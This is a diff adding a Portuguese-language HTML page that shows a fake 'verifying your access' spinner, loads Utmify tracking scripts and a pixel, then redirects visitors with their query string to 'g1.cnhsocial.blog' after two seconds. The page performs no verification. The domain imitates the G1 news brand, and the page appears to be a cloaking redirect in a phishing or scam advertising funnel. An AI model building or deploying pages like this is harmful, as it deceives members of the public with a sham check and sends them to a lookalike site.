@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verificando Acesso...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      color: #000000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .loader {
+      border: 8px solid #888787;
+      border-top: 8px solid #FF0000;
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      text-align: center;
+      margin: 0;
+      font-size: 20px;
+    }
+  </style>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+
+<script>
+  window.pixelId = "686eff0223afdf0949f6aae2";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+</head>
+<body>
+  <div class="loader"></div>
+  <h1>Verificando seu acesso... <br>Aguarde</h1>
+
+  <script>
+    // Redireciona após 2 segundos (2000 milissegundos)
+    setTimeout(function () {
+      window.location.href = 'https://g1.cnhsocial.blog'+window.location.search; // Altere para o link desejado
+    }, 2000);
+  </script>
+</body>
+</html>
